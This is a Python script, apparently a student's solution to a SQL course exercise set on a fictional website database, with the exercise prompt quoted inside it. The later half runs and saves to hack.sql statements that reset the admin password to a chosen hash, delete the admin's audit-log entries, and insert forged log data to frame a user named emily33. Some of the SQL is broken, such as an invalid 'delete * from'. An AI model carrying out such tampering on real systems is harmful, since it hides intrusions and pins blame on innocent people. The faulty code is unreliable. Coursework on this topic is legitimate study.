# -*- coding: utf-8 -*-
"""
Created on Fri May 17 10:16:18 2024

@author: Admin
"""
import sqlite3

try:
    # connect to database
    db = sqlite3.connect(r"E:\SQL\dont-panic\dont-panic.db")
    cursor = db.cursor()

    # Create database #.open E:\SQL\dont-panic\don-panic.db                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
    cursor.execute("""CREATE TABLE IF NOT EXISTS Persons (PersonID INTEGER PRIMARY KEY AUTOINCREMENT,FirstName varchar(255),LastName varchar(255));""")

    # Insert data into database
    sql_statements = ["INSERT INTO Persons (FirstName,LastName) VALUES ('Charlie','Jackson');", "INSERT INTO Persons (FirstName,LastName) VALUES ('Scott','Jackson');", "INSERT INTO Persons (FirstName,LastName) VALUES ('Dave','Jackson');","INSERT INTO Persons (FirstName,LastName) VALUES ('Audrey','Plastiras');","INSERT INTO Persons (FirstName,LastName) VALUES ('Nikki','Plastiras');","INSERT INTO Persons (FirstName,LastName) VALUES ('Dave','Plastiras');","INSERT INTO Persons (FirstName,LastName) VALUES ('Grace','Plastiras');"]
    for statement in sql_statements:
        print(statement)
        cursor.execute(statement)

    db.commit()

except Exception as e:
    print("Connection failed: ", e)

#users items ordes user_logs    
print(cursor.execute(''' PRAGMA table_info(users);''').fetchall())
'''[(0, 'id', 'INTEGER', 0, None, 1), (1, 'type', 'TEXT', 1, None, 0), (2, 'old_username', 'TEXT', 0, None, 0), (3, 'new_username', 'TEXT', 0, None, 0), (4, 'old_password', 'TEXT', 0, None, 0), (5, 'new_password', 'TEXT', 0, None, 0)]'''

'''In hack.sql, write a sequence of SQL statements to achieve the following:

Alter the password of the website’s administrative account, admin, to instead be “oops!”.
Erase any logs of the above password change recorded by the database.
Add false data to throw others off your trail. In particular, to frame emily33, make it only appear—in the user_logs table—as if the admin account has had its password changed to emily33’s password.
'''

# select * from users where username is 'admin';
#1|admin|e10adc3949ba59abbe56e057f20f883e

#Alter the password of the website’s administrative account, admin, to instead be “oops!”.
print(cursor.execute('''update users set password = "982c0381c279d139fd221fce974916e7" where username is "admin";''').fetchall())
#must have exactly one of create/read/write/append mode

print(cursor.execute('''select * from users where username is "admin";''').fetchall())
#[(1, 'admin', '982c0381c279d139fd221fce974916e7')]


#Erase any logs of the above password change recorded by the database.
#sqlite> select * from user_logs where id = 1;
#1|insert||admin||e10adc3949ba59abbe56e057f20f883e
print(cursor.execute('''select * from user_logs where id = (select id from users where username is "admin");''').fetchall())

print(cursor.execute('''delete * from user_logs where id = (select id from users where username is "admin");''').fetchall())

#Add false data to throw others off your trail. In particular, to frame emily33, make it only appear—in the user_logs table—as if the admin account has had its password changed to emily33’s password.
print(cursor.execute('''update user_logs set type ="insert",new_password = (select password from users where username is "emily33") where id = (select id from users where username is "admin") ;''').fetchall())

print(cursor.execute('''insert into user_logs (id,type,new_password) values (1,"insert",(select password from users where username is "emily33"));''').fetchall())

#write into hack.sql
def asw(file,queries):
    with open(file,'w') as f:
        f.write(queries)
        
asw1 = 'update users set password = "982c0381c279d139fd221fce974916e7" where username is "admin";'
asw2 = 'delete * from user_logs where id = (select id from users where username is "admin");'
asw3 = 'insert into user_logs (id,type,new_password) values (1,"insert",(select password from users where username is "emily33"));'
asw(r'E:\SQL\dont-panic\hack.sql','\n'.join([asw1,asw2,asw3]))
